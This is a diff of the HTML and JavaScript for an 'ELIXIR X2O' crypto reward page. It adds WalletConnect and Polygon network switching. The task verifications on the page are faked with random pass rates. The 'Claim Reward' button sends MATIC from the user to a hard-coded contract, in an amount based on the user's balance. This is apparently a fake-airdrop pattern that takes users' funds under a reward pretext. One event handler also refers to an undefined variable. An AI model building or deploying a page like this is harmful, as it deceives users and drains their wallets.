@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ELIXIR X2O - Reward Platform</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.1/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <style>
         :root {
             --primary: #8B5CF6;
@@ -13,13 +14,13 @@
             --light: #F8FAFC;
             --accent: #F59E0B;
         }
-        
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
             font-family: 'Arial', sans-serif;
             background: linear-gradient(135deg, var(--dark) 0%, #2D1B69 100%);
@@ -27,7 +28,7 @@
             min-height: 100vh;
             padding: 20px;
         }
-        
+
         .container {
             max-width: 800px;
             margin: 0 auto;
@@ -37,12 +38,12 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(139, 92, 246, 0.3);
         }
-        
+
         .header {
             text-align: center;
             margin-bottom: 30px;
         }
-        
+
         .logo {
             width: 120px;
             height: 120px;
@@ -51,20 +52,20 @@
             border: 3px solid var(--primary);
             padding: 5px;
         }
-        
+
         h1 {
             color: var(--secondary);
             font-size: 2.5em;
             margin-bottom: 10px;
             text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
         }
-        
+
         .subtitle {
             color: var(--accent);
             font-size: 1.2em;
             margin-bottom: 30px;
         }
-        
+
         .wallet-section {
             background: rgba(139, 92, 246, 0.1);
             border-radius: 15px;
@@ -72,7 +73,7 @@
             margin-bottom: 30px;
             border: 1px solid var(--primary);
         }
-        
+
         .wallet-info {
             display: flex;
             justify-content: space-between;
@@ -80,7 +81,7 @@
             flex-wrap: wrap;
             gap: 15px;
         }
-        
+
         .btn {
             background: linear-gradient(135deg, var(--primary) 0%, #7C3AED 100%);
             color: white;
@@ -94,29 +95,33 @@
             text-decoration: none;
             display: inline-block;
         }
-        
+
         .btn:hover {
             transform: translateY(-2px);
             box-shadow: 0 5px 15px rgba(139, 92, 246, 0.4);
         }
-        
+
         .btn-secondary {
             background: linear-gradient(135deg, var(--accent) 0%, #D97706 100%);
         }
-        
+
+        .btn-walletconnect {
+            background: linear-gradient(135deg, #3B99FC 0%, #2A6FDB 100%);
+        }
+
         .btn:disabled {
             background: #6B7280;
             cursor: not-allowed;
             transform: none;
         }
-        
+
         .poison-chips {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
             gap: 20px;
             margin-bottom: 30px;
         }
-        
+
         .chip {
             background: rgba(6, 214, 160, 0.1);
             border: 2px solid var(--secondary);
@@ -125,22 +130,22 @@
             text-align: center;
             transition: all 0.3s ease;
         }
-        
+
         .chip:hover {
             transform: translateY(-5px);
             box-shadow: 0 10px 20px rgba(6, 214, 160, 0.3);
         }
-        
+
         .chip.completed {
             background: rgba(6, 214, 160, 0.2);
             border-color: var(--secondary);
         }
-        
+
         .chip-icon {
             font-size: 2em;
             margin-bottom: 10px;
         }
-        
+
         .reward-section {
             background: rgba(245, 158, 11, 0.1);
             border-radius: 15px;
@@ -148,7 +153,7 @@
             border: 1px solid var(--accent);
             text-align: center;
         }
-        
+
         .reward-amount {
             font-size: 3em;
             color: var(--accent);
@@ -156,7 +161,7 @@
             margin: 20px 0;
             text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
         }
-        
+
         .status {
             padding: 10px 20px;
             border-radius: 25px;
@@ -164,34 +169,34 @@
             margin: 10px 0;
             display: inline-block;
         }
-        
+
         .status.connected {
             background: rgba(6, 214, 160, 0.2);
             color: var(--secondary);
             border: 1px solid var(--secondary);
         }
-        
+
         .status.disconnected {
             background: rgba(239, 68, 68, 0.2);
             color: #EF4444;
             border: 1px solid #EF4444;
         }
-        
+
         .balance {
             font-size: 1.1em;
             color: var(--secondary);
             margin: 10px 0;
         }
-        
+
         .hidden {
             display: none;
         }
-        
+
         .loading {
             text-align: center;
             padding: 20px;
         }
-        
+
         .spinner {
             border: 3px solid rgba(139, 92, 246, 0.3);
             border-top: 3px solid var(--primary);
@@ -201,19 +206,14 @@
             animation: spin 1s linear infinite;
             margin: 0 auto;
         }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
+
         .social-links {
             display: flex;
             justify-content: center;
             gap: 20px;
             margin-top: 20px;
         }
-        
+
         .social-link {
             color: var(--light);
             text-decoration: none;
@@ -222,7 +222,7 @@
             border-radius: 10px;
             transition: all 0.3s ease;
         }
-        
+
         .social-link:hover {
             background: var(--primary);
             transform: translateY(-2px);
@@ -234,22 +234,50 @@
             min-height: 20px;
         }
 
+        .wallet-buttons {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+
+        .token-info {
+            background: rgba(139, 92, 246, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 15px;
+            border: 1px solid var(--primary);
+        }
+
+        .token-address {
+            font-family: monospace;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 12px;
+            border-radius: 5px;
+            margin: 5px 0;
+            word-break: break-all;
+        }
+
         @media (max-width: 768px) {
             .container {
                 padding: 20px;
             }
-            
+
             h1 {
                 font-size: 2em;
             }
-            
+
             .wallet-info {
                 flex-direction: column;
                 text-align: center;
             }
-            
+
             .poison-chips {
                 grid-template-columns: 1fr;
+            }
+
+            .wallet-buttons {
+                flex-direction: column;
             }
         }
     </style>
@@ -261,18 +289,30 @@
             <h1>ELIXIR X2O</h1>
             <div class="subtitle">Collect Poison Chips & Earn Rewards</div>
         </div>
-        
+
         <div class="wallet-section">
             <div class="wallet-info">
                 <div>
                     <div id="connectionStatus" class="status disconnected">Disconnected</div>
                     <div id="walletAddress" class="balance">Connect your wallet to start</div>
                     <div id="walletBalance" class="balance"></div>
+                    <div id="networkStatus" class="balance"></div>
+                    
+                    <!-- Token Information Section -->
+                    <div class="token-info">
+                        <strong>ELIXIR X2O Token Info:</strong>
+                        <div class="token-address" id="tokenAddress">0x36461f6Cf95102A9F8Cc5ea7FBAB1d61f247680F</div>
+                        <button class="btn btn-secondary" onclick="addTokenToWallet()">Add Token to Wallet</button>
+                    </div>
                 </div>
-                <button id="connectWallet" class="btn">Connect Wallet</button>
+                <div class="wallet-buttons">
+                    <button id="connectWallet" class="btn">MetaMask</button>
+                    <button id="connectWalletConnect" class="btn btn-walletconnect">WalletConnect</button>
+                    <button id="switchNetwork" class="btn btn-secondary" style="display: none;">Switch to Polygon</button>
+                </div>
             </div>
         </div>
-        
+
         <div class="poison-chips">
             <div class="chip" id="connectChip">
                 <div class="chip-icon">🔗</div>
@@ -281,7 +321,7 @@
                 <button class="btn" onclick="claimChip('connect')" disabled>Claim Chip</button>
                 <div id="connectStatus" class="chip-status"></div>
             </div>
-            
+
             <div class="chip" id="twitterChip">
                 <div class="chip-icon">🐦</div>
                 <h3>Follow Twitter</h3>
@@ -290,7 +330,7 @@
                 <button class="btn" onclick="verifyTwitterFollow()" disabled style="margin-top: 10px;">Verify & Claim</button>
                 <div id="twitterStatus" class="chip-status"></div>
             </div>
-            
+
             <div class="chip" id="telegramChip">
                 <div class="chip-icon">📢</div>
                 <h3>Join Telegram</h3>
@@ -300,7 +340,7 @@
                 <div id="telegramStatus" class="chip-status"></div>
             </div>
         </div>
-        
+
         <div class="reward-section">
             <h2>Your ELIXIR X2O Reward</h2>
             <div id="rewardAmount" class="reward-amount">0 X2O</div>
@@ -308,7 +348,7 @@
             <button id="claimReward" class="btn" disabled>Claim Reward</button>
             <div id="rewardStatus" class="status" style="margin-top: 15px;"></div>
         </div>
-        
+
         <div class="social-links">
             <a href="https://x.com/x2o_elixir" target="_blank" class="social-link">Twitter</a>
             <a href="https://t.me/x2o_elixir" target="_blank" class="social-link">Telegram</a>
@@ -319,7 +359,33 @@
         // Contract addresses and ABI
         const REWARD_CONTRACT_ADDRESS = '0x3d40486964451466ecb3ba0659eade5964b72082';
         const TOKEN_ADDRESS = '0x36461f6Cf95102A9F8Cc5ea7FBAB1d61f247680F';
-        
+        const TOKEN_SYMBOL = 'X2O';
+        const TOKEN_DECIMALS = 18;
+        const TOKEN_IMAGE = 'https://photos.pinksale.finance/file/pinksale-logo-upload/1759585455577-acd56ecf144d00796cdd7c3c76348a4c.jpg';
+
+        // Polygon Network Configuration
+        const POLYGON_MAINNET_PARAMS = {
+            chainId: '0x89', // 137 in hexadecimal
+            chainName: 'Polygon Mainnet',
+            nativeCurrency: {
+                name: 'MATIC',
+                symbol: 'MATIC',
+                decimals: 18
+            },
+            rpcUrls: ['https://polygon-rpc.com/'],
+            blockExplorerUrls: ['https://polygonscan.com/']
+        };
+
+        // WalletConnect Configuration
+        const WALLETCONNECT_CONFIG = {
+            rpc: {
+                137: "https://polygon-rpc.com/"
+            },
+            chainId: 137,
+            bridge: "https://bridge.walletconnect.org",
+            qrcode: true
+        };
+
         // ABI for the reward contract (simplified)
         const REWARD_CONTRACT_ABI = [
             "function participateWithMatic() payable",
@@ -335,6 +401,9 @@
         let signer;
         let rewardContract;
         let userAddress;
+        let currentChainId = null;
+        let walletConnectProvider = null;
+        let isWalletConnect = false;
         let claimedChips = {
             connect: false,
             twitter: false,
@@ -363,13 +432,16 @@
             // Check if MetaMask is installed
             if (typeof window.ethereum !== 'undefined') {
                 provider = new ethers.providers.Web3Provider(window.ethereum);
-                
+
+                // Check current network
+                await checkNetwork();
+
                 // Check if already connected
                 const accounts = await provider.listAccounts();
                 if (accounts.length > 0) {
                     await connectWallet();
                 }
-                
+
                 // Auto-reconnect when MetaMask accounts change
                 window.ethereum.on('accountsChanged', async (accounts) => {
                     if (accounts.length > 0) {
@@ -378,77 +450,288 @@
                         disconnectWallet();
                     }
                 });
-                
+
                 // Auto-reconnect when chain changes
                 window.ethereum.on('chainChanged', async (chainId) => {
-                    await connectWallet();
+                    currentChainId = parseInt(chainId);
+                    await updateNetworkStatus();
+                    if (accounts.length > 0) {
+                        await connectWallet();
+                    }
                 });
             } else {
-                alert('Please install MetaMask to use this dApp!');
+                // Hide MetaMask button if not installed
+                document.getElementById('connectWallet').style.display = 'none';
+            }
+
+            // Initialize WalletConnect
+            initWalletConnect();
+        }
+
+        // Initialize WalletConnect
+        function initWalletConnect() {
+            try {
+                // WalletConnect will be initialized when user clicks the button
+                console.log('WalletConnect ready for initialization');
+            } catch (error) {
+                console.error('Error initializing WalletConnect:', error);
             }
         }
 
-        // Connect wallet function
-        async function connectWallet() {
+        // Connect with WalletConnect
+        async function connectWalletConnect() {
             try {
-                document.getElementById('connectWallet').disabled = true;
-                document.getElementById('connectWallet').textContent = 'Connecting...';
-                
-                // Request account access
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                
-                provider = new ethers.providers.Web3Provider(window.ethereum);
+                document.getElementById('connectWalletConnect').disabled = true;
+                document.getElementById('connectWalletConnect').textContent = 'Connecting...';
+
+                // Initialize WalletConnect Provider
+                walletConnectProvider = new WalletConnectProvider.default(WALLETCONNECT_CONFIG);
+
+                // Enable session (triggers QR Code modal)
+                await walletConnectProvider.enable();
+
+                // Create ethers provider from WalletConnect provider
+                provider = new ethers.providers.Web3Provider(walletConnectProvider);
+                isWalletConnect = true;
+
+                // Get signer and address
                 signer = provider.getSigner();
                 userAddress = await signer.getAddress();
-                
+
+                // Set current chain ID for WalletConnect
+                currentChainId = 137; // WalletConnect is set to Polygon
+
                 // Initialize contract
                 rewardContract = new ethers.Contract(REWARD_CONTRACT_ADDRESS, REWARD_CONTRACT_ABI, signer);
-                
+
                 // Update UI
                 updateWalletInfo();
                 enableChipButtons();
                 await updateRewardInfo();
-                
+                await updateNetworkStatus();
+
                 // Auto-claim connect chip
                 if (!claimedChips.connect) {
                     await claimChip('connect');
                 }
+
+                // WalletConnect event listeners
+                walletConnectProvider.on("accountsChanged", (accounts) => {
+                    if (accounts.length > 0) {
+                        userAddress = accounts[0];
+                        updateWalletInfo();
+                    } else {
+                        disconnectWallet();
+                    }
+                });
+
+                walletConnectProvider.on("chainChanged", (chainId) => {
+                    currentChainId = parseInt(chainId);
+                    updateNetworkStatus();
+                    updateWalletInfo();
+                });
+
+                walletConnectProvider.on("disconnect", (code, reason) => {
+                    console.log("WalletConnect disconnected:", code, reason);
+                    disconnectWallet();
+                });
+
+            } catch (error) {
+                console.error('Error connecting with WalletConnect:', error);
+                alert('Error connecting with WalletConnect: ' + error.message);
+                document.getElementById('connectWalletConnect').disabled = false;
+                document.getElementById('connectWalletConnect').textContent = 'WalletConnect';
+            }
+        }
+
+        // Add token to wallet
+        async function addTokenToWallet() {
+            if (typeof window.ethereum === 'undefined') {
+                alert('Please install MetaMask or a Web3 wallet to add tokens');
+                return;
+            }
+
+            try {
+                const wasAdded = await window.ethereum.request({
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20',
+                        options: {
+                            address: TOKEN_ADDRESS,
+                            symbol: TOKEN_SYMBOL,
+                            decimals: TOKEN_DECIMALS,
+                            image: TOKEN_IMAGE,
+                        },
+                    },
+                });
+
+                if (wasAdded) {
+                    alert('ELIXIR X2O token successfully added to your wallet!');
+                } else {
+                    alert('Token was not added. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error adding token to wallet:', error);
+                alert('Error adding token to wallet: ' + error.message);
+            }
+        }
+
+        // Check and switch to Polygon network if needed
+        async function checkNetwork() {
+            try {
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                currentChainId = parseInt(chainId);
                 
+                await updateNetworkStatus();
+                
+                if (currentChainId !== 137) {
+                    document.getElementById('switchNetwork').style.display = 'inline-block';
+                } else {
+                    document.getElementById('switchNetwork').style.display = 'none';
+                }
+            } catch (error) {
+                console.error('Error checking network:', error);
+            }
+        }
+
+        // Switch to Polygon network
+        async function switchToPolygon() {
+            try {
+                document.getElementById('switchNetwork').disabled = true;
+                document.getElementById('switchNetwork').textContent = 'Switching...';
+                
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: POLYGON_MAINNET_PARAMS.chainId }],
+                });
+                
+                // Network switched successfully
+                currentChainId = 137;
+                await updateNetworkStatus();
+                document.getElementById('switchNetwork').style.display = 'none';
+                
+            } catch (switchError) {
+                // This error code indicates that the chain has not been added to MetaMask
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [POLYGON_MAINNET_PARAMS],
+                        });
+                        
+                        currentChainId = 137;
+                        await updateNetworkStatus();
+                        document.getElementById('switchNetwork').style.display = 'none';
+                        
+                    } catch (addError) {
+                        console.error('Error adding Polygon network:', addError);
+                        alert('Error adding Polygon network to MetaMask');
+                    }
+                } else {
+                    console.error('Error switching to Polygon:', switchError);
+                    alert('Error switching to Polygon network');
+                }
+            } finally {
+                document.getElementById('switchNetwork').disabled = false;
+                document.getElementById('switchNetwork').textContent = 'Switch to Polygon';
+            }
+        }
+
+        // Update network status display
+        async function updateNetworkStatus() {
+            const networkStatus = document.getElementById('networkStatus');
+            
+            if (currentChainId === 137) {
+                networkStatus.textContent = 'Network: Polygon Mainnet';
+                networkStatus.style.color = '#06D6A0';
+            } else {
+                networkStatus.textContent = `Network: Wrong Network (Please switch to Polygon)`;
+                networkStatus.style.color = '#EF4444';
+            }
+        }
+
+        // Connect wallet function (MetaMask)
+        async function connectWallet() {
+            try {
+                document.getElementById('connectWallet').disabled = true;
+                document.getElementById('connectWallet').textContent = 'Connecting...';
+
+                // Request account access
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+                isWalletConnect = false;
+
+                // Check network again after connection
+                await checkNetwork();
+
+                // Initialize contract only if on Polygon
+                if (currentChainId === 137) {
+                    rewardContract = new ethers.Contract(REWARD_CONTRACT_ADDRESS, REWARD_CONTRACT_ABI, signer);
+                }
+
+                // Update UI
+                updateWalletInfo();
+                enableChipButtons();
+                await updateRewardInfo();
+
+                // Auto-claim connect chip
+                if (!claimedChips.connect) {
+                    await claimChip('connect');
+                }
+
             } catch (error) {
                 console.error('Error connecting wallet:', error);
                 alert('Error connecting wallet: ' + error.message);
                 document.getElementById('connectWallet').disabled = false;
-                document.getElementById('connectWallet').textContent = 'Connect Wallet';
+                document.getElementById('connectWallet').textContent = 'MetaMask';
             }
         }
 
         // Update wallet information
         async function updateWalletInfo() {
             if (!userAddress) return;
-            
-            const balance = await provider.getBalance(userAddress);
-            const formattedBalance = ethers.utils.formatEther(balance);
-            
-            document.getElementById('connectionStatus').textContent = 'Connected';
-            document.getElementById('connectionStatus').className = 'status connected';
-            document.getElementById('walletAddress').textContent = `Address: ${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
-            document.getElementById('walletBalance').textContent = `Balance: ${parseFloat(formattedBalance).toFixed(4)} MATIC`;
-            document.getElementById('connectWallet').textContent = 'Connected';
+
+            try {
+                const balance = await provider.getBalance(userAddress);
+                const formattedBalance = ethers.utils.formatEther(balance);
+
+                document.getElementById('connectionStatus').textContent = isWalletConnect ? 'Connected (WalletConnect)' : 'Connected';
+                document.getElementById('connectionStatus').className = 'status connected';
+                document.getElementById('walletAddress').textContent = `Address: ${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
+                document.getElementById('walletBalance').textContent = `Balance: ${parseFloat(formattedBalance).toFixed(4)} MATIC`;
+                document.getElementById('connectWallet').textContent = 'MetaMask';
+                document.getElementById('connectWalletConnect').textContent = 'WalletConnect';
+            } catch (error) {
+                console.error('Error updating wallet info:', error);
+            }
         }
 
         // Disconnect wallet
         function disconnectWallet() {
+            // Disconnect WalletConnect if active
+            if (isWalletConnect && walletConnectProvider) {
+                walletConnectProvider.disconnect();
+            }
+
             userAddress = null;
             signer = null;
-            
+            isWalletConnect = false;
+            walletConnectProvider = null;
+
             document.getElementById('connectionStatus').textContent = 'Disconnected';
             document.getElementById('connectionStatus').className = 'status disconnected';
             document.getElementById('walletAddress').textContent = 'Connect your wallet to start';
             document.getElementById('walletBalance').textContent = '';
+            document.getElementById('networkStatus').textContent = '';
             document.getElementById('connectWallet').disabled = false;
-            document.getElementById('connectWallet').textContent = 'Connect Wallet';
+            document.getElementById('connectWalletConnect').disabled = false;
+            document.getElementById('connectWallet').textContent = 'MetaMask';
+            document.getElementById('connectWalletConnect').textContent = 'WalletConnect';
             document.getElementById('rewardAmount').textContent = '0 X2O';
-            
+
             disableChipButtons();
         }
 
@@ -473,30 +756,30 @@
         // Claim poison chip
         async function claimChip(type) {
             if (!userAddress) return;
-            
+
             const chipElement = document.getElementById(`${type}Chip`);
             const button = chipElement.querySelectorAll('button')[1] || chipElement.querySelector('button');
             const statusElement = document.getElementById(`${type}Status`);
-            
+
             try {
                 button.disabled = true;
                 button.textContent = 'Claiming...';
                 statusElement.textContent = 'Processing...';
                 statusElement.style.color = '#F59E0B';
-                
+
                 // Simulate claim process
                 await new Promise(resolve => setTimeout(resolve, 1500));
-                
+
                 claimedChips[type] = true;
                 chipElement.classList.add('completed');
                 button.textContent = 'Claimed!';
                 button.classList.add('claimed');
                 statusElement.textContent = '✓ Poison chip claimed!';
                 statusElement.style.color = '#06D6A0';
-                
+
                 // Update reward after claiming chip
                 await updateRewardInfo();
-                
+
             } catch (error) {
                 console.error('Error claiming chip:', error);
                 button.textContent = 'Error - Try Again';
@@ -517,22 +800,22 @@
 
         async function verifyTwitterFollow() {
             if (!userAddress) return;
-            
+
             const statusElement = document.getElementById('twitterStatus');
             const verifyButton = document.querySelector('#twitterChip button:nth-child(4)');
-            
+
             try {
                 verifyButton.disabled = true;
                 verifyButton.textContent = 'Verifying...';
                 statusElement.textContent = 'Verifying Twitter follow...';
                 statusElement.style.color = '#F59E0B';
-                
+
                 // Simulate API call to verify Twitter follow
                 await new Promise(resolve => setTimeout(resolve, 3000));
-                
+
                 // Simulate successful verification (80% success rate for demo)
                 const verified = Math.random() > 0.2;
-                
+
                 if (verified) {
                     statusElement.textContent = '✓ Twitter follow verified!';
                     statusElement.style.color = '#06D6A0';
@@ -543,7 +826,7 @@
                     verifyButton.disabled = false;
                     verifyButton.textContent = 'Verify & Claim';
                 }
-                
+
             } catch (error) {
                 console.error('Twitter verification error:', error);
                 statusElement.textContent = '❌ Verification failed. Please try again.';
@@ -564,22 +847,22 @@
 
         async function verifyTelegramJoin() {
             if (!userAddress) return;
-            
+
             const statusElement = document.getElementById('telegramStatus');
             const verifyButton = document.querySelector('#telegramChip button:nth-child(4)');
-            
+
             try {
                 verifyButton.disabled = true;
                 verifyButton.textContent = 'Verifying...';
                 statusElement.textContent = 'Verifying Telegram membership...';
                 statusElement.style.color = '#F59E0B';
-                
+
                 // Simulate API call to verify Telegram membership
                 await new Promise(resolve => setTimeout(resolve, 3000));
-                
+
                 // Simulate successful verification (80% success rate for demo)
                 const verified = Math.random() > 0.2;
-                
+
                 if (verified) {
                     statusElement.textContent = '✓ Telegram membership verified!';
                     statusElement.style.color = '#06D6A0';
@@ -590,7 +873,7 @@
                     verifyButton.disabled = false;
                     verifyButton.textContent = 'Verify & Claim';
                 }
-                
+
             } catch (error) {
                 console.error('Telegram verification error:', error);
                 statusElement.textContent = '❌ Verification failed. Please try again.';
@@ -603,14 +886,14 @@
         // Update reward information based on wallet balance
         async function updateRewardInfo() {
             if (!userAddress || !provider) return;
-            
+
             try {
                 const balance = await provider.getBalance(userAddress);
                 const reward = calculateReward(balance);
-                
+
                 document.getElementById('rewardAmount').textContent = 
                     `${ethers.utils.formatEther(reward)} X2O`;
-                
+
             } catch (error) {
                 console.error('Error updating reward info:', error);
             }
@@ -629,41 +912,41 @@
         // Claim reward
         async function claimReward() {
             if (!userAddress || !rewardContract) return;
-            
+
             const button = document.getElementById('claimReward');
             const status = document.getElementById('rewardStatus');
-            
+
             try {
                 button.disabled = true;
                 button.textContent = 'Claiming...';
                 status.textContent = 'Processing transaction...';
                 status.style.color = '#F59E0B';
-                
+
                 const balance = await provider.getBalance(userAddress);
                 const requiredAmount = getRequiredAmountForReward(balance);
-                
+
                 if (balance.lt(requiredAmount)) {
                     throw new Error(`Insufficient balance. Required: ${ethers.utils.formatEther(requiredAmount)} MATIC`);
                 }
-                
+
                 // Execute the transaction
                 const tx = await rewardContract.participateWithMatic({
                     value: requiredAmount
                 });
-                
+
                 status.textContent = 'Transaction submitted. Waiting for confirmation...';
-                
+
                 // Wait for transaction confirmation
                 const receipt = await tx.wait();
-                
+
                 status.textContent = 'Reward claimed successfully!';
                 status.style.color = '#06D6A0';
                 button.textContent = 'Claimed!';
-                
+
                 // Update wallet info
                 await updateWalletInfo();
                 await updateRewardInfo();
-                
+
             } catch (error) {
                 console.error('Error claiming reward:', error);
                 status.textContent = `Error: ${error.message}`;
@@ -685,7 +968,9 @@
 
         // Event listeners
         document.getElementById('connectWallet').addEventListener('click', connectWallet);
+        document.getElementById('connectWalletConnect').addEventListener('click', connectWalletConnect);
         document.getElementById('claimReward').addEventListener('click', claimReward);
+        document.getElementById('switchNetwork').addEventListener('click', switchToPolygon);
 
         // Initialize app when page loads
         window.addEventListener('load', initApp);
